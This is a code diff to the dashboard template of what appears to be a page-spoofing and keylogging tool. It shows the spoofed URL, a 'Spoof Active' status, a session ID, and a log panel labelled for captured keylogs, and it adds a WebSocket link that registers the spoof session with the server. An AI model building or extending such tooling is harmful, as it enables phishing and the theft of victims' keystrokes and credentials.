@@ -126,7 +126,7 @@
         <h1 class="text-3xl font-bold">Spoofing <%= page.url %></h1>
         <div class="loader spoof-active"></div>
         <h4 class="activity-indicator active text-xl">Spoof Active</h4>
-        <h6 class="text-gray-400 text-xs">Session ID: <%= page.id %> </h6>
+        <h6 class="text-gray-400 text-xs">Session ID: <span id="spoof-id"><%= page.id %></span> </h6>
         <p class="mt-12">
           <a href="<%= page.url %>" class="text-blue-800 block text-xs" target="_blank"
             >Click to visit spoofed page.</a
@@ -136,7 +136,7 @@
           </a>
         </p>
       </div>
-      <div id="logger-output" class="mx-auto mt-16 text-left max-w-md shadow-md p-3 border-2 ">
+      <div id="logger-output" class="mx-auto mt-16 text-left container p-3 border-2 border-gray-300 px-3">
         <h2 class="">Activity...</h2>
         <div id="logs">
           <!-- Keylogs directed here -->
@@ -150,6 +150,18 @@
       window.onbeforeunload = () => {
         return "Leaving this page will destroy your spoof session.";
       };
+    </script>
+    <!-- establish websocket connection to server -->
+    <script>
+      console.log('Opening websocket link...')
+      const ws = new WebSocket(`ws:/${window.location.host}`)
+      ws.onopen = (w) => {
+        console.log('Websocket open.')
+        ws.send(document.getElementById('spoof-id').innerHTML)
+      }
+      ws.onmessage = (ev) =>{
+        console.log(ev)
+      }
     </script>
   </body>
 </html>
